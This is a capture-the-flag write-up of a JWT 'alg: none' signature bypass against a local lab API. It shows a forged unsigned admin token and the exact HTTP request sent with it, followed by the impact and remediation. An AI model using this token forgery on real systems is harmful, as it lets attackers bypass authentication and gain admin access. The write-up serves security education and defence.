# Writeup - Unsigned Access

---

## Challenge Name / Title

**Unsigned Access**

---

## Vulnerability Identified

**JWT Signature Bypass — `alg: none` Attack**

The application exposes an API endpoint `/api/admin/flag` that requires a valid JWT Bearer token with an admin role. During testing, I crafted a JWT token with the `alg` header set to `none` — meaning no signature is required. The application accepted this unsigned token as valid and returned the admin flag, confirming it was not properly validating the JWT signature algorithm.

---

## Exploitation Steps / Description

**Step 1:** A JWT is made of three base64url-encoded parts: `header.payload.signature`

**Step 2:** Craft a forged token manually:

- **Header:** `{"alg":"none","typ":"JWT"}` → base64url encode → `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`
- **Payload:** `{"role":"admin"}` → base64url encode → `eyJyb2xlIjoiYWRtaW4ifQ`
- **Signature:** leave completely empty

**Step 3:** Combine as `header.payload.` (note the trailing dot with no signature):
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.
```

**Step 4:** Open Burp Suite → Repeater and send the forged token:

```http
GET /api/admin/flag HTTP/1.1
Host: localhost:3000
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.
Connection: close

```

**Step 5:** The server accepts the unsigned token, recognizes the `role: admin` claim, and returns the flag in the JSON response.

---


## Flag Obtained

```
FLAG{jwt_c8a2a286}
```

---

## Impact

In a real banking application, this vulnerability allows any attacker to:
- Forge a JWT token claiming any role (admin, superuser, etc.) without knowing the secret key
- Gain unauthorized access to privileged API endpoints
- Access other users' data or perform administrative actions
- Bypass all role-based access controls enforced via JWT

This is a **Critical** severity vulnerability as it completely undermines the authentication and authorization model of the API.

---

## Mitigation / Remediation

1. **Reject `alg: none` Explicitly:** The server must check the algorithm specified in the JWT header and reject tokens that use `none` or any unexpected algorithm outright.
2. **Use a Trusted Library:** Use a well-maintained JWT library (e.g. `PyJWT`) that enforces algorithm validation by default and does not accept unsigned tokens.
3. **Whitelist Allowed Algorithms:** Explicitly specify which algorithms are allowed (e.g. only `HS256`) when verifying tokens — never allow the client to dictate the algorithm.
4. **Validate All Claims:** Always validate the signature before trusting any claims in the payload such as `role` or `user`.
